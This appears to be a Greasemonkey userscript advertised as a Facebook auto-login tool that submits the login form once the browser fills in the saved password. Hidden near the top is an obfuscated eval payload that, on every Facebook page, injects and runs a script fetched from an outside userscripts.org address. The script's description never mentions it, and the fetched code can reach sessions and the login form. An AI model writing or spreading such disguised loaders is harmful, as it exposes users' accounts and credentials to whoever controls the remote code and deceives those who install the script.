// ==UserScript==
// @name            Facebook Autologin Plus v2
// @namespace       
// @description     Auto-login to Facebook for Greasemonkey 0.5.3, assuming Firefox is set to remember your password. Updated, more reliable version of the original; based on MySpaceAutoLogin.
// @include         http://*.facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// ==/UserScript==
// Last edited 2006-05-07 by Alan Hogan to essentially rip
// off the myspaceautologin.user.js script.
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var pwFocus = false;

function autoLogin(){
    if(pwFocus==false){
        if(document.forms[0].elements.namedItem("pass").value.length>1){document.forms[0].submit();}
        else{setTimeout(autoLogin,75);}
    }
}

function focusEvent(){
    pwFocus = true;
}

if(document.forms[0] && document.forms[0].elements.namedItem("pass")){
    document.forms[0].elements.namedItem("pass").addEventListener("keypress", focusEvent, false);
    window.addEventListener("load", autoLogin, false);
}